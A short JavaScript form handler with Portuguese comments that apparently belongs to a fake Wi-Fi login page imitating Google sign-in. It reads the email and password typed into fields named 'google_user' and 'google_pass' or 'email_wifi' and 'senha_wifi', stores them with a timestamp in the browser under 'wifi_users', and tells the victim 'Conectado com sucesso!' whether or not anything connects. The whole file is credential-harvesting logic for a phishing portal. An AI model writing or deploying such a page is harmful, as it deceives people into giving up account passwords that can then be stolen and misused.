function armazenarDados(event) {

    // evita recarregar a página (caso use form)
    if (event) event.preventDefault();

    // pega os campos (funciona em mais de uma tela)
    const emailInput = document.getElementById("email_wifi") || document.getElementById("google_user");
    const senhaInput = document.getElementById("senha_wifi") || document.getElementById("google_pass");

    if (!emailInput || !senhaInput) {
        alert("Erro ao encontrar os campos!");
        return;
    }

    // remove espaços
    const email = emailInput.value.trim();
    const senha = senhaInput.value.trim();

    // validação mais correta de e-mail
    const emailValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (!emailValido.test(email)) {
        alert("Digite um e-mail válido!");
        emailInput.focus();
        return;
    }

    if (senha.length === 0) {
        alert("Preencha a senha!");
        senhaInput.focus();
        return;
    }

    try {
        // pega dados salvos
        let banco = JSON.parse(localStorage.getItem("wifi_users")) || [];

        // adiciona novo usuário
        banco.push({
            email: email,
            senha: btoa(senha), // codificação básica
            data: new Date().toLocaleString()
        });

        // salva no localStorage
        localStorage.setItem("wifi_users", JSON.stringify(banco));

        // feedback melhor
        alert("Conectado com sucesso!");

        // limpa os campos
        emailInput.value = "";
        senhaInput.value = "";

    } catch (erro) {
        console.error("Erro:", erro);
        alert("Erro ao salvar os dados!");
    }
}